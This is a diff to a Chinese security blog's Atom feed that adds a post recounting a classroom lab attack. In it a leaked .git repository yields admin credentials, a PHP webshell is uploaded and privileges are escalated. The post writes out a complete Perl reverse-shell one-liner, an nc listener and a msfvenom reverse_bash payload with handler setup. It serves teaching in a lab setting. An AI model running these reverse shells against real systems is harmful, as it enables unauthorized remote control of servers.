@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://pgg666.org/"/>
-  <updated>2019-04-14T03:31:02.293Z</updated>
+  <updated>2019-04-22T14:51:32.433Z</updated>
   <id>https://pgg666.org/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>对网站后台的一次大马攻击并反弹提权</title>
+    <link href="https://pgg666.org/2019/04/22/%E5%AF%B9%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%80%E6%AC%A1%E5%A4%A7%E9%A9%AC%E6%94%BB%E5%87%BB%E5%B9%B6%E5%8F%8D%E5%BC%B9%E6%8F%90%E6%9D%83/"/>
+    <id>https://pgg666.org/2019/04/22/对网站后台的一次大马攻击并反弹提权/</id>
+    <published>2019-04-21T16:00:00.000Z</published>
+    <updated>2019-04-22T14:51:32.433Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="对网站后台的一次大马攻击并反弹提权"><a href="#对网站后台的一次大马攻击并反弹提权" class="headerlink" title="对网站后台的一次大马攻击并反弹提权"></a>对网站后台的一次大马攻击并反弹提权</h1><p><strong>前言：</strong>   <em>经常使用一句话木马，总感觉没有什么存在感，今天第一次使用大马，很是有点激动的</em></p><p><u>所需工具： 测试网站，是老师帮我们搭建的，小伙伴们千万不要用别人的网站做实验哦大马，大马是在<a href="https://github.com/" target="_blank" rel="noopener">https://github.com</a>上找到的，大家要仔细分析，千万不要被黑吃黑</u></p><ol><li><p><em>实验开始，老师给了一段ip  192.168.0.127拿到ip  我先用nmap扫描看看</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/1.png"></p></li></ol><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/2.png"></p><ol start="2"><li><p><em>它告诉我们 博客正在搭建  既然有的话  那我就得扫一下它的目录了</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/3.png"></p><ol start="3"><li><em>不得了 .git源码泄露了   还爆出了admin.php等目录，我们先把他源码爆出了，使用 GitHack  嗯，你们可以去<a href="https://github.com/" target="_blank" rel="noopener">https://github.com</a>下载它   开始爆了</em></li></ol></li></ol><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/4.png"></p><p>爆出来了我们去看一看</p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/5.png"></p><ol start="4"><li><p><em>直接就出来了账号密码  我们去访问 admin.php  使用这个账号密码  看能不能登录</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/6.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/7.png"></p><ol start="5"><li><p><em>现在上传大马，看看能不能连接</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/8.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/9.png"></p></li></ol></li></ol><ol start="6"><li><p>*现在我们开始反弹提权  木马shell打命令</p><p>perl -e’use Socket;$i=”192.168.0.135”;$p=1235;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p><p>kail 命令打 nc –lvp 1235*</p></li></ol><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/10.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/11.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/12.png"></p><p>我们cd ..  看看根目录</p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/13.png"></p><ol start="7"><li><p><em>Home 是储存账户信息的 我们进去看看</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/14.png"></p></li><li><p><em>我们用exp打这个文件   开一个kali界面   使用命令：msfvenom -p<br>  cmd/unix/reverse_bash LHOST=192.168.0.153 LPORT=1143</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/15.png"></p></li><li><p><em>现在我们把它加到.sh文件中  ，这里我们就用kail的shell加</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/16.png"></p></li><li><p><em>然后我们kail用msf进入监听模块，去监听他   监听exp =  exploit/multi/handler  Payload是我们生成时候用的payload</em></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/17.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/18.png"></p><p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/19.png"></p></li></ol><p><del>一次提权就结束了 实际操作还是需要多多练习呢</del></p><p>#注：  <strong>生活就是冲着未来，不要总沉浸在悲伤里</strong></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;对网站后台的一次大马攻击并反弹提权&quot;&gt;&lt;a href=&quot;#对网站后台的一次大马攻击并反弹提权&quot; class=&quot;headerlink&quot; title=&quot;对网站后台的一次大马攻击并反弹提权&quot;&gt;&lt;/a&gt;对网站后台的一次大马攻击并反弹提权&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;前言
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>域渗透神器Empire的一次简单渗透</title>
